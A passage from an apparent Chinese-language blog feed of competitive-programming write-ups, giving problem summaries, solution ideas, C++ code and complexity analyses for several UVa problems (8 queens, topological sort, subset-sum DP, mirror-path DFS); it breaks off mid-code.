<p>我們會拿到一串以 <code>/</code> 切割的字串，每個 <code>/</code> 之間代表一個小節的內容</p>
<p>請你判斷出其中有多少小節的長度剛好是 1 拍</p>
<h2 id="想法1"><a href="#想法1" class="headerlink" title="想法1"></a>想法1</h2><p>每個小節我們都拿一個變數紀錄音符的總長度</p>
<p>我們可以跟著題目的想法做，遇到相對應的音符代號，就將長度記錄下來</p>
<p>在每個小節結束後，如果長度剛好為 1 拍，就記錄下來</p>
<p>輸入的部分我們可以這樣處理:</p>
<p>每次遇到 <code>/</code> 就看看我們紀錄音符長度的值是不是剛好為 1 拍，如果是就紀錄下來</p>
<p>無論有沒有剛好為 1 拍，都必須要將記錄長度的變數歸零</p>
<h2 id="想法2"><a href="#想法2" class="headerlink" title="想法2"></a>想法2</h2><p>如果不想要處理麻煩的小數問題，可以這樣想</p>
<p>觀察可以用的音符，可以發現到所有音符長度的最小公倍數是 64</p>
<p>將全部的音符長度都乘上 64 後，都會變成整數，這樣就完美的忽略小數的問題了!</p>
<p>那麼一個小節的長度也就變成 64 囉!</p>
<h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code 1"></a>Code 1</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s)&#123;</span><br><span class="line">		<span class="keyword">double</span> cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(s==<span class="string">"*"</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">'/'</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(cnt == <span class="number">1</span>) ans++;</span><br><span class="line">				cnt=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">'W'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">1.0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'H'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.5</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'Q'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.25</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'E'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.125</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'S'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.0625</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.03125</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'X'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">0.015625</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code 2"></a>Code 2</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s)&#123;</span><br><span class="line">		<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(s==<span class="string">"*"</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">'/'</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(cnt == <span class="number">64</span>) ans++;</span><br><span class="line">				cnt=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">'W'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">64</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'H'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">32</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'Q'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">16</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'E'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">8</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'S'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">4</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">2</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'X'</span>)&#123;</span><br><span class="line">					cnt+=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每次輸入會針對字串的每個字原作相對應的計算</p>
<p>而每個計算的時間複雜度為 $O(1)$</p>
<p>每筆測資的時間複雜度為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 167</title>
    <url>/2021/04/27/UVa167/</url>
    <content><![CDATA[<h1 id="UVa-167"><a href="#UVa-167" class="headerlink" title="UVa 167"></a>UVa 167</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?167" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?167</a></p>
<p>在一個 $8 \times 8$ 的西洋棋棋盤上要放上 $8$ 個皇后，並且所有皇后之間彼此不能在對方的攻擊範圍內，也就是經典的 $8$ 皇后問題</p>
<p>現在在棋盤上的每個格子都有一個數字，求所有符合 $8$ 皇后的情況下，所有皇后所在的格子數字總和最大是多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為棋盤大小固定只有 $8 \times 8$，可以考慮用比較暴力的方式去做</p>
<p>枚舉每一橫排的皇后可以存在的位置，直到所有橫排都枚舉完後記錄當前的數字總和並記錄下最大的情況</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">8</span>][<span class="number">8</span>], path_x[<span class="number">8</span>], path_y[<span class="number">8</span>], k, ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == <span class="number">8</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 計算當前數字總和</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">			tot += arr[path_x[i]][path_y[i]];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 找出最大值</span></span><br><span class="line">		ans=max(ans, tot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 對於橫排的 8 個位置枚舉</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">bool</span> cango = <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">// 檢查 depth 排以前的皇后與現在的位置是否衝突</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;depth ; j++)&#123;</span><br><span class="line">			<span class="comment">// 檢查是否在同一列上</span></span><br><span class="line">			<span class="keyword">if</span>(path_y[j] == i)&#123;</span><br><span class="line">				cango=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 檢查是否在同一斜線上</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">abs</span>(path_x[j]-depth) == <span class="built_in">abs</span>(path_y[j]-i))&#123;</span><br><span class="line">				cango=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(cango)&#123;</span><br><span class="line">			path_x[depth] = depth;</span><br><span class="line">			path_y[depth] = i;</span><br><span class="line">			dfs(depth+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">	<span class="keyword">while</span>(k--)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">8</span> ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		dfs(<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// 輸出格式須符合總長度為 5，不足則以空格補齊</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;setw(<span class="number">5</span>)&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>令 $n = 8$</p>
<p>每筆測資輸入時間複雜度為 $O(n^2)$</p>
<p>DFS 每層最多有 $8$ 種選擇，總共有 $8$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^n)$</p>
<p>總時間複雜度為 $O(kn^{n+2})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 200</title>
    <url>/2021/04/27/UVa200/</url>
    <content><![CDATA[<h1 id="UVa-200"><a href="#UVa-200" class="headerlink" title="UVa 200"></a>UVa 200</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?200" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?200</a></p>
<p>給定一群字串，這群字串是依照某種字母順序的排序由小到大排序而成的</p>
<p>字母都只有大寫英文字母，請找出所有出現過的字母由小到大排序後的樣子</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為這題是給定兩元素之間的關係，然後求出排序後的樣子，所以可以想到用拓樸排序</p>
<p>透過比較相鄰兩字串之間第一個不同的字元，就可以找到一組關係式，根據這個關係我們可以在兩個元素之間建立一條邊，並且記錄下連到的元素入度大小</p>
<p>每次找到入度為 $0$ 的元素輸出，並且將下一個連接到的元素入度皆減 $1$</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// By Koios</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> pre, now;</span><br><span class="line"><span class="keyword">int</span> in[<span class="number">26</span>], used[<span class="number">26</span>], tot=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> edge[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">		in[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">			edge[i][j] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;pre;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;pre.size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used[pre[i]-<span class="string">'A'</span>])&#123;</span><br><span class="line">			used[pre[i]-<span class="string">'A'</span>]++;</span><br><span class="line">			tot++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;now &amp;&amp; now!=<span class="string">"#"</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;now.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!used[now[i]-<span class="string">'A'</span>])&#123;</span><br><span class="line">				used[now[i]-<span class="string">'A'</span>]++;</span><br><span class="line">				tot++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;pre.size() &amp;&amp; i&lt;now.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(now[i] != pre[i])&#123;</span><br><span class="line">				<span class="keyword">if</span>(!edge[pre[i]-<span class="string">'A'</span>][now[i]-<span class="string">'A'</span>])&#123;</span><br><span class="line">					in[now[i]-<span class="string">'A'</span>]++;</span><br><span class="line">					edge[pre[i]-<span class="string">'A'</span>][now[i]-<span class="string">'A'</span>]=<span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		pre=now;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;tot ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">26</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(in[j] == <span class="number">0</span> &amp;&amp; used[j])&#123;</span><br><span class="line">				in[j]--;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(j+<span class="string">'A'</span>);</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;<span class="number">26</span> ; k++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(j==k) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span>(edge[j][k])&#123;</span><br><span class="line">						in[k]--;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>輸入時間複雜度為 $O(\sum{|now|})$</p>
<p>假設 $n = 26$</p>
<p>拓樸排序時間複雜度最差為 $O(n^3)$</p>
<p>總時間複雜度約為 $O(\sum{|now|} + n^3)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>Topological Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa12455</title>
    <url>/2020/06/25/UVa12455/</url>
    <content><![CDATA[<h1 id="UVa12455"><a href="#UVa12455" class="headerlink" title="UVa12455"></a>UVa12455</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?12455" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?12455</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個長度的棍子都可以用其他棍子組合而成<br>定義 $DP[i]$ 表示可以組成長度i的棍子<br>則有 $DP[i] = DP[i-k] ,k \leq i$<br>對於每個棍子都看看能不能透過這個棍子與其他棍子的組合組成新的長度</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,p,arr[<span class="number">1005</span>],dp[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;p;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">1005</span> ; i++)dp[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;p ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="comment">//dp[i]=dp[i-k], k&lt;=i</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;p ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=n ; j&gt;=arr[i] ; j--)&#123;</span><br><span class="line">				<span class="keyword">if</span>(dp[j-arr[i]])</span><br><span class="line">					dp[j]=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(dp[n])</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"YES\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"NO\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>共有n種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度為 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 258</title>
    <url>/2021/04/27/UVa258/</url>
    <content><![CDATA[<h1 id="UVa-258"><a href="#UVa-258" class="headerlink" title="UVa 258"></a>UVa 258</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?258" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?258</a></p>
<p>給一個 $n \times m$ 的方格，在最外圍保證只有兩個點是 <code>.</code>，表示起點以及終點，其餘都是 <code>*</code></p>
<p>起點會有一束光源源不絕射入，如果遇到地圖當中的鏡子 <code>/</code> 或是 <code>\</code> 就會被反射，這裡的鏡子都會是以 $45^{\circ}$ 放置，也就是說光會轉向 $90^{\circ}$</p>
<p>每個鏡子都可以選擇要是 <code>/</code> 或是 <code>\</code>，輸出其中一組可以使光照射出終點的盤面</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先先找到起點以及終點，因為是光所以其實起點終點相反也沒關係</p>
<p>再來對於光來說方向也是重要的狀態，所以也同時先找到起點光射入的方向</p>
<p>找到之後嘗試跟著方向走，如果遇到鏡子就分成兩種情況</p>
<ol>
<li>跟著鏡子反射，然後固定這個鏡子的方向</li>
<li>如果之前沒有光線經過這個鏡子，那我們就嘗試轉方向</li>
</ol>
<p>這裡很重要的是要記錄這個鏡子有沒有被光線走過，如果有光線經過而我們又調整鏡子的方向，可能會導致光線不會走到現在的點上</p>
<p>那麼一直走到出口就找到答案了</p>
<p>因為每次都是一路走到底，所以可以用 DFS 去嘗試每種走法</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// 0: up , 1: right, 2: down, 3: left</span></span><br><span class="line"><span class="keyword">int</span> n ,m, start_x, start_y, end_x, end_y, start_dir, end_dir, nx, ny, n_dir;</span><br><span class="line"><span class="keyword">int</span> dx[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> dy[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">55</span>][<span class="number">55</span>], out=<span class="literal">false</span>, found;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> dir)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(found) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==end_x &amp;&amp; y==end_y)&#123;</span><br><span class="line">		found=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(arr[x][y] == <span class="string">'.'</span>)&#123;</span><br><span class="line">		nx = x + dx[dir];</span><br><span class="line">		ny = y + dy[dir];</span><br><span class="line">		DFS(nx, ny, dir);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(arr[x][y] == <span class="string">'*'</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[x][y] == <span class="string">'/'</span>)&#123;</span><br><span class="line">			<span class="keyword">bool</span> tmp=used[x][y];</span><br><span class="line">			used[x][y] = <span class="literal">true</span>;</span><br><span class="line">			n_dir = dir^<span class="number">1</span>;</span><br><span class="line">			nx = x + dx[n_dir];</span><br><span class="line">			ny = y + dy[n_dir];</span><br><span class="line">			DFS(nx, ny, n_dir);</span><br><span class="line">			used[x][y] = tmp;</span><br><span class="line">			<span class="comment">// spin mirror</span></span><br><span class="line">			<span class="keyword">if</span>(!used[x][y])&#123;</span><br><span class="line">				used[x][y] = <span class="literal">true</span>;</span><br><span class="line">				arr[x][y] = <span class="string">'\\'</span>;</span><br><span class="line">				n_dir = <span class="number">3</span>-dir;</span><br><span class="line">				nx = x + dx[n_dir];</span><br><span class="line">				ny = y + dy[n_dir];</span><br><span class="line">				DFS(nx, ny, n_dir);</span><br><span class="line">				arr[x][y] = <span class="string">'/'</span>;</span><br><span class="line">				used[x][y] = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">bool</span> tmp=used[x][y];</span><br><span class="line">			used[x][y] = <span class="literal">true</span>;</span><br><span class="line">			n_dir = <span class="number">3</span>-dir;</span><br><span class="line">			nx = x + dx[n_dir];</span><br><span class="line">			ny = y + dy[n_dir];</span><br><span class="line">			DFS(nx, ny, n_dir);</span><br><span class="line">			used[x][y] = tmp;</span><br><span class="line">			<span class="comment">// spin mirror</span></span><br><span class="line">			<span class="keyword">if</span>(!used[x][y])&#123;</span><br><span class="line">				used[x][y] = <span class="literal">true</span>;</span><br><span class="line">				arr[x][y] = <span class="string">'/'</span>;</span><br><span class="line">				n_dir = dir^<span class="number">1</span>;</span><br><span class="line">				nx = x + dx[n_dir];</span><br><span class="line">				ny = y + dy[n_dir];</span><br><span class="line">				DFS(nx, ny, n_dir);</span><br><span class="line">				arr[x][y] = <span class="string">'\\'</span>;</span><br><span class="line">				used[x][y] = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=<span class="number">-1</span> &amp;&amp; n!=<span class="number">-1</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span 